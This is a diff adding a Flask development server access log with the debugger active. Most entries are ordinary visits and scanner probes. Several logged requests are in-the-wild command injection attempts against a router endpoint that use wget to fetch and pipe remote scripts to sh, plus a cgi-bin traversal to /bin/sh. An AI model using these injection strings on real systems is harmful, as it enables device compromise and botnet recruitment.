@@ -1,0 +1,145 @@
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.0.0.4:80
+Press CTRL+C to quit
+ * Restarting with watchdog (inotify)
+ * Debugger is active!
+ * Debugger PIN: 109-607-496
+218.55.157.246 - - [28/Sep/2024 13:32:57] "GET / HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:32:58] "GET /static/logo.png HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:32:59] "GET /static/favicon.ico HTTP/1.1" 404 -
+218.55.157.246 - - [28/Sep/2024 13:33:13] "GET /api HTTP/1.1" 404 -
+218.55.157.246 - - [28/Sep/2024 13:33:13] "GET /favicon.ico HTTP/1.1" 404 -
+218.55.157.246 - - [28/Sep/2024 13:33:20] "GET /api/list HTTP/1.1" 400 -
+34.83.176.217 - - [28/Sep/2024 13:33:39] "GET /api/list HTTP/1.1" 400 -
+34.83.176.217 - - [28/Sep/2024 13:33:51] "POST /api/search HTTP/1.1" 400 -
+34.83.176.217 - - [28/Sep/2024 13:35:28] "GET /api/list HTTP/1.1" 400 -
+218.55.157.246 - - [28/Sep/2024 13:36:29] "GET / HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:36:29] "GET /static/logo.png HTTP/1.1" 304 -
+34.83.176.217 - - [28/Sep/2024 13:42:59] "POST /api/regi HTTP/1.1" 400 -
+34.83.176.217 - - [28/Sep/2024 13:43:04] "GET /api/list HTTP/1.1" 400 -
+218.55.157.246 - - [28/Sep/2024 13:48:45] "GET / HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:48:45] "GET /static/logo.png HTTP/1.1" 304 -
+5.8.11.202 - - [28/Sep/2024 13:48:47] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+5.8.11.202 - - [28/Sep/2024 13:48:47] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" HTTPStatus.BAD_REQUEST -
+218.55.157.246 - - [28/Sep/2024 13:49:37] "GET / HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:49:37] "GET /static/logo.png HTTP/1.1" 304 -
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.0.0.4:80
+Press CTRL+C to quit
+ * Restarting with watchdog (inotify)
+ * Debugger is active!
+ * Debugger PIN: 931-420-418
+218.55.157.246 - - [28/Sep/2024 13:52:21] "GET / HTTP/1.1" 200 -
+218.55.157.246 - - [28/Sep/2024 13:52:21] "GET /static/logo.png HTTP/1.1" 304 -
+141.98.11.79 - - [28/Sep/2024 14:10:17] "GET / HTTP/1.1" 200 -
+149.50.103.48 - - [28/Sep/2024 14:26:28] "GET / HTTP/1.1" 200 -
+45.148.10.242 - - [28/Sep/2024 15:01:36] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 -
+178.211.139.188 - - [28/Sep/2024 15:13:22] "GET / HTTP/1.1" 200 -
+185.191.126.213 - - [28/Sep/2024 15:17:34] "GET / HTTP/1.1" 200 -
+185.191.126.213 - - [28/Sep/2024 16:19:55] "GET / HTTP/1.1" 200 -
+149.50.103.48 - - [28/Sep/2024 16:21:29] "GET / HTTP/1.1" 200 -
+95.214.55.43 - - [28/Sep/2024 16:30:36] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 -
+185.224.128.67 - - [28/Sep/2024 16:51:23] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.19.99/t|sh;`) HTTP/1.1" 404 -
+185.191.126.213 - - [28/Sep/2024 16:59:26] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [28/Sep/2024 17:13:04] "GET / HTTP/1.0" 200 -
+154.213.184.15 - - [28/Sep/2024 17:16:30] "POST /cgi-bin/.%%%2%e/.%%%2%e/.%%%2%e/.%%%2%e/.%%%2%e/bin/sh HTTP/1.1" 404 -
+149.50.103.48 - - [28/Sep/2024 17:49:37] "GET / HTTP/1.1" 200 -
+141.98.11.79 - - [28/Sep/2024 18:11:34] "GET / HTTP/1.1" 200 -
+185.191.126.213 - - [28/Sep/2024 18:14:48] "GET / HTTP/1.1" 200 -
+185.16.39.118 - - [28/Sep/2024 18:16:55] "GET / HTTP/1.1" 200 -
+152.42.219.47 - - [28/Sep/2024 18:34:46] "GET /cdn-cgi/trace HTTP/1.1" 404 -
+152.42.219.47 - - [28/Sep/2024 18:34:47] code 400, message Bad request version ('À\x13À')
+152.42.219.47 - - [28/Sep/2024 18:34:47] "\x16\x03\x01\x01\x0b\x01\x00\x01\x07\x03\x03\\\x99¬KÎÜýqX?"ºöê \x98èw\x14\x14õ¡ISç¦¿à\x1a¶\x89É L?æc´\x18\x11©Ñ\x1eË\x97ï¹À\x1fu\x16\x8aéî{5ßØ\x18Í¤D\x9b;7\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+80.82.77.202 - - [28/Sep/2024 18:36:48] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.77.202 - - [28/Sep/2024 18:36:48] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" HTTPStatus.BAD_REQUEST -
+5.8.11.202 - - [28/Sep/2024 19:07:30] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+5.8.11.202 - - [28/Sep/2024 19:07:30] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" HTTPStatus.BAD_REQUEST -
+167.94.145.110 - - [28/Sep/2024 19:17:07] "GET / HTTP/1.1" 200 -
+167.94.145.110 - - [28/Sep/2024 19:17:11] "GET / HTTP/1.1" 200 -
+167.94.145.110 - - [28/Sep/2024 19:17:12] "GET /static/favicon.ico HTTP/1.1" 404 -
+167.94.145.110 - - [28/Sep/2024 19:17:12] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.110 - - [28/Sep/2024 19:17:13] code 505, message Invalid HTTP version (2.0)
+167.94.145.110 - - [28/Sep/2024 19:17:13] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+87.236.176.52 - - [28/Sep/2024 19:21:07] "GET / HTTP/1.1" 200 -
+87.236.176.12 - - [28/Sep/2024 19:21:08] "GET /static/favicon.ico HTTP/1.1" 404 -
+157.245.216.203 - - [28/Sep/2024 19:21:09] "GET /static/favicon.ico HTTP/1.1" 404 -
+5.8.11.202 - - [28/Sep/2024 19:21:15] "GET / HTTP/1.0" 200 -
+198.235.24.133 - - [28/Sep/2024 19:30:15] "GET / HTTP/1.0" 200 -
+199.45.154.140 - - [28/Sep/2024 19:35:11] code 400, message Bad request version ('À\x14À')
+199.45.154.140 - - [28/Sep/2024 19:35:11] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ü]qó\x97\x9e\x9a#jG@\x88%¦\x9d@¾\x9d\x18Î1¹Ñù\x97MÍã\x038iè Õ\x8dÇô¯Ýê/Â\x0d»\x8d\x0bìî\x9eÅnÒ\x9e\x19\x15\x93É\x8f\x1eth\x8c\\Ù\x01\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+46.174.191.32 - - [28/Sep/2024 19:40:06] "GET / HTTP/1.0" 200 -
+185.224.128.59 - - [28/Sep/2024 19:54:38] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id>`for+pid+in+/proc/[0-9]*/;+do+pid%3D${pid%25/};+pid%3D${pid%23%23*/};+exe_path%3D$(ls+-l+/proc/$pid/exe+2>/dev/null+|+awk+'{print+$NF}');+if+[[+$exe_path+%3D%3D+*/+]];+then+kill+-9+$pid;+fi;+done;` HTTP/1.1" 404 -
+185.224.128.59 - - [28/Sep/2024 19:54:38] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id>`wget+http://185.157.247.125/e/t+-O-+|sh;` HTTP/1.1" 404 -
+45.84.89.3 - - [28/Sep/2024 19:57:03] "GET / HTTP/1.0" 200 -
+198.235.24.2 - - [28/Sep/2024 20:01:26] "GET / HTTP/1.1" 200 -
+185.224.128.67 - - [28/Sep/2024 20:14:12] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.19.99/t|sh;`) HTTP/1.1" 404 -
+13.83.41.58 - - [28/Sep/2024 20:16:30] "GET /portal/redlion HTTP/1.1" 404 -
+149.50.103.48 - - [28/Sep/2024 20:17:48] "GET / HTTP/1.1" 200 -
+185.191.126.213 - - [28/Sep/2024 20:28:40] "GET / HTTP/1.1" 200 -
+141.98.11.79 - - [28/Sep/2024 20:31:23] "GET / HTTP/1.1" 200 -
+199.45.155.81 - - [28/Sep/2024 20:37:19] "GET / HTTP/1.1" 200 -
+199.45.155.81 - - [28/Sep/2024 20:37:22] "GET / HTTP/1.1" 200 -
+199.45.155.81 - - [28/Sep/2024 20:37:22] "GET /static/favicon.ico HTTP/1.1" 404 -
+199.45.155.81 - - [28/Sep/2024 20:37:22] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.155.81 - - [28/Sep/2024 20:37:23] code 505, message Invalid HTTP version (2.0)
+199.45.155.81 - - [28/Sep/2024 20:37:23] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+205.210.31.8 - - [28/Sep/2024 20:45:27] code 400, message Bad request version ('À\x13À')
+205.210.31.8 - - [28/Sep/2024 20:45:27] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÿêû§\x01Çú\x18_°\x94|qWZ/è½_\x8f\x1b\x01óÆ·\x9cU=\x19F\x98I ä\x96*úgùTö\x08x£\x1ct6þW>\x90\x92WC\x90úÙ\x8aÁ\x13÷\x91B\x97\x8e\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+205.210.31.8 - - [28/Sep/2024 20:45:28] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.8 - - [28/Sep/2024 20:45:28] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x80ð\x17!îßñO¹,G¯ó\x9d\x06/mÙ¥\x0ecËµüQ\x8fò(¾\x02\x1dq\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+179.43.133.162 - - [28/Sep/2024 20:49:17] "CONNECT cloudflare.com:443 HTTP/1.1" 404 -
+185.191.126.213 - - [28/Sep/2024 21:24:36] "GET / HTTP/1.1" 200 -
+80.66.83.49 - - [28/Sep/2024 21:26:30] code 400, message Bad request syntax ('\x04\x01\x00\x194eD\x13\x00')
+80.66.83.49 - - [28/Sep/2024 21:26:30] "\x04\x01\x00\x194eD\x13\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.49 - - [28/Sep/2024 21:27:30] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.49 - - [28/Sep/2024 21:27:30] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.49 - - [28/Sep/2024 21:27:30] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 404 -
+95.214.55.43 - - [28/Sep/2024 21:33:15] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 -
+52.156.140.29 - - [28/Sep/2024 22:05:06] "GET / HTTP/1.0" 200 -
+185.191.126.213 - - [28/Sep/2024 22:17:51] "GET / HTTP/1.1" 200 -
+45.148.10.242 - - [28/Sep/2024 22:21:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 -
+149.50.103.48 - - [28/Sep/2024 22:27:27] "GET / HTTP/1.1" 200 -
+152.42.136.45 - - [28/Sep/2024 23:32:05] "GET / HTTP/1.1" 200 -
+172.105.246.56 - - [28/Sep/2024 23:38:40] "POST /cgi-bin/mft/wireless_mft HTTP/1.1" 404 -
+185.191.126.213 - - [28/Sep/2024 23:46:31] "GET / HTTP/1.1" 200 -
+147.185.133.49 - - [29/Sep/2024 00:13:33] "GET / HTTP/1.1" 200 -
+164.92.159.97 - - [29/Sep/2024 00:17:10] "CONNECT google.com:443 HTTP/1.1" 404 -
+162.158.118.67 - - [29/Sep/2024 00:28:12] "GET / HTTP/1.1" 200 -
+172.70.222.178 - - [29/Sep/2024 00:28:17] "GET / HTTP/1.1" 200 -
+172.70.223.177 - - [29/Sep/2024 00:28:18] "GET /static/logo.png HTTP/1.1" 200 -
+172.70.223.201 - - [29/Sep/2024 00:28:18] "GET /static/favicon.ico HTTP/1.1" 404 -
+ * Detected change in '/home/azureuser/server/app.py', reloading
+ * Detected change in '/home/azureuser/server/app.py', reloading
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+Error: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+ * Restarting with watchdog (inotify)
+ * Debugger is active!
+ * Debugger PIN: 931-420-418
